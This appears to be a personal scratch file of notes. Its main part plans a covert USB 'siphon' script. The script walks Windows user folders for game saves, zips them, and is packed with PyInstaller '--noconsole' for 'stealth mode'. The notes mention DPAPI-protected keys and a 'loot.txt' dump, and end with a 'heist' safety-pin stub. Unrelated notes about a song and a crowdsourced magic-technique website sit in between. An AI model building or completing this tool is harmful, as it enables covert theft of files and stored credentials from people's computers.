DATALANCE_GHOST_SIPHON
#name
# not using a rubber ducky yet. those are too expensive

The Python Script (migrate.py):

Use os.walk to find game save directories.

Use shutil.make_archive to zip them up.

Use getpass.getuser() to ensure you're looking in the right home directory.



PyInstaller or Nuitka
To run your script on a Windows machine that doesn't have Python installed, you need to "Freeze" the code into a standalone .exe

The Command: pyinstaller --onefile --noconsole --name "YourToolName" mainframe.py

--onefile: Packs everything into one .exe.

--noconsole: Prevents a boring black command prompt from popping up (stealth mode).

# for linux mounted to windows
/mnt/windows/Users/Drake/AppData/...

# if in windows
C:\Users\<User>\Saved Games

C:\Users\<User>\AppData\Local\<GameName>

C:\Users\<User>\Documents\My Games

# key stored in the Windows
# DPAPI, etc.
# save to loot.txt




'''
# love this song
Falling In Reverse - "I'm Not A Vampire (Revamped)"

# i want to make music that gives very tiny hints to my past and states of mind

'''
'''
Crowdsourced Thaumaturgy Lab
magic site

The "Jaffe Academy" System Design
Instead of a single moderator deciding what is "true," use a Triangulation System similar to how the SCP Foundation "verifies" anomalies.

- The Claim: A user submits a "Technique" (e.g., "Burned Mugwort at 3:00 AM induces lucid dreaming").

- The Trial: Three other users of a specific "Rank" must attempt to replicate the result under the same conditions.

- The Reward: If the results match, the original "Truth Teller" receives "Insight Points" and the technique is moved from Speculative to Verified.

eye of newt is actually mustard, specificly refering to mustard seeds. bizzar.


|Tier	    |Name	            |Focus	                    |SCP Equivalent |
|-|-|-|-|
|Level 1	|The Outer Garment	|Herbology & Chemistry.     |Using physical plants to affect the body/mind. Safe, repeatable, biological.	Bio-Hazard Safety   |
|Level 2	|The Starry Robe	|Astronomy & Timing.        |Learning when "windows" of influence open (circadian rhythms, lunar cycles, etc.).	Temporal Anomalies  |
|Level 3	|The Inner Secret	|Kabbalah & Consciousness.  |The "Code" of reality. Using language and intent to trigger changes.	Memetic/Thaumaturgy |
|-|-|-|-|
|-|-|-|-|
|-|-|-|-|
|-|-|-|-|

models:
Truth Teller
Claim
Trial
Reward
Insight Points
decay system


'''

# example code


import os

def check_safety_pin():
    # If a file named 'STOP' exists on the USB, the script aborts immediately.
    if os.path.exists("STOP.txt"):
        print("Safety Pin detected. Aborting heist.")
        exit()

check_safety_pin()
# ... rest of your 'stealing' code goes here ...

